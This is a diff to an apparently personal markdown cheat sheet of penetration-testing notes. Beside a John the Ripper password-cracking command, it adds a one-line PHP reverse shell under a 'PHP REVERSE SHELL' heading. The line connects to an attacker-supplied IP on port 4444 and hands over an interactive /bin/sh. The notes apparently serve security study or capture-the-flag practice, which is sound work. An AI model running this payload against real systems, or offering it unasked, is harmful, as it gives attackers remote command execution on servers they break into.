@@ -88,6 +88,10 @@ john id_rsa.hash --wordlist=[../wordlist.txt]
 <br>
 
 # PHP REVERSE SHELL
+> If we see something called command execution:
+```
+php -r '$sock=fsockopen("[Your IP Address]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 > First, open the php document. (If you search for this php file as php-reverse-shell, you will see many examples.)
 ```
 nano ../php-reverse-shell.php
